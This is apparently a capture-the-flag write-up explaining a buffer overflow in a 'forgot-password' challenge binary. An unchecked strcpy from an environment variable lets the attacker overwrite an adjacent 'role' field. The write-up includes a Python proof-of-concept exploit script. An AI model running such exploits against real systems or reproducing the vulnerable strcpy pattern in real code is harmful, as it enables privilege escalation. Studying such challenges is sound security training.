
# Vulnerability
----
This challenge happens in the `forgot-password` binary file.

It is very similar to the [Ov3rwr1t3](Ov3rwr1t3.md) challenge.

We see in the source code the `role` variable is declared in a struct just after the `hash` one. And the `hash` variable has a hardcoded 151 bytes size.

Knowing that then, then hash is verified using `strncmp`, with the 32 first bytes, we can just hardcode a hash, then fill the other bytes with random characters, and overflow with *"management"*. This will trigger the following condition:

```C
struct {
	char hash[151];
	char role[64];
  } locals = {
	.hash = {0},
	.role = "user"
  };
char *ptr = getenv("DEHASH");
strcpy(locals.hash, ptr);
  if (!strcmp(locals.role, "management"))
	dehash(locals.hash);
```


By matching a flag with the 32 first bytes, the hash is found and the tip (being a flag we could not access in the given source code) is revealed.

# PoC
---

```python
#!/usr/bin/env python3

import subprocess
import os

HASH = "327a6c4304ad5938eaf0efb6cc3e53dc"
binary_path = '/opt/intern/forgot-password'
payload = HASH + (151 - 32) * 'A' + 'management'

def exploit_overwrite():
    try:
        os.environ["DEHASH"] = payload
        process = subprocess.Popen(
            [binary_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=False
        )
        stdout, stderr = process.communicate()
        print("Output of the program:")
        print(stdout.decode('latin-1'))

    except FileNotFoundError:
        print(f"Could not find {binary_path} binary file")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    exploit_overwrite()

```

